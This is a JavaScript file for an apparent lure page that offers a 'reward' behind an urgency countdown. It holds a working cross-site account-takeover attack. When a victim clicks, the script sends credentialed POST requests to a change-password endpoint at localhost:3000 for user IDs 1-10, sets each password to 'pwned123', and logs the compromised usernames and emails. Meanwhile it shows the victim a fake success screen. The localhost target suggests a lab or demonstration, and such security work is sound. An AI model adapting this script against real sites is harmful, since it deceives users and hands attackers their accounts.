// Countdown timer for urgency
let timeLeft = 299;
const countdownEl = document.getElementById('countdown');

const timer = setInterval(() => {
    const minutes = Math.floor(timeLeft / 60);
    const seconds = timeLeft % 60;
    countdownEl.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
    timeLeft--;

    if (timeLeft < 0) {
        clearInterval(timer);
        countdownEl.textContent = 'EXPIRED';
    }
}, 1000);

// Attack configuration
const ATTACKER_PASSWORD = 'pwned123';
const TARGET_IDS = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10];
const API_URL = 'http://localhost:3000/api/transfer/change-password';

async function attackUser(userId) {
    try {
        const response = await fetch(API_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            credentials: 'include',
            body: JSON.stringify({
                userid: userId,
                new_password: ATTACKER_PASSWORD
            })
        });

        const data = await response.json();

        if (response.ok) {
            console.log(`[SUCCESS] User ${userId}: Password changed to "${ATTACKER_PASSWORD}"`);
            console.log(`  -> Username: ${data.user?.username}, Email: ${data.user?.email}`);
            return { userId, success: true, data };
        } else {
            console.log(`[FAILED] User ${userId}: ${data.error}`);
            return { userId, success: false, error: data.error };
        }
    } catch (error) {
        console.log(`[ERROR] User ${userId}: ${error.message}`);
        return { userId, success: false, error: error.message };
    }
}

async function claimReward() {
    // Show loading state
    document.getElementById('initial-state').style.display = 'none';
    document.getElementById('loading-state').classList.add('active');

    console.log('='.repeat(60));
    console.log(`Target: ${API_URL}`);
    console.log(`User IDs: ${TARGET_IDS.join(', ')}`);
    console.log(`New Password: ${ATTACKER_PASSWORD}`);
    console.log('='.repeat(60));

    // Execute bruteforce attack
    const results = await Promise.all(TARGET_IDS.map(id => attackUser(id)));

    // Count successes
    const successCount = results.filter(r => r.success).length;
    const compromised = results.filter(r => r.success);

    console.log('='.repeat(60));
    console.log('ATTACK COMPLETE');
    console.log(`Success: ${successCount}/${TARGET_IDS.length}`);
    console.log('='.repeat(60));

    if (compromised.length > 0) {
        console.log('\nCOMPROMISED ACCOUNTS:');
        console.table(compromised.map(r => ({
            'User ID': r.userId,
            'Username': r.data.user?.username || 'N/A',
            'Email': r.data.user?.email || 'N/A',
            'New Password': ATTACKER_PASSWORD
        })));
    }

    // Simulate processing delay
    await new Promise(resolve => setTimeout(resolve, 2000));

    // Show success state
    document.getElementById('loading-state').classList.remove('active');
    document.getElementById('success-state').classList.add('active');
}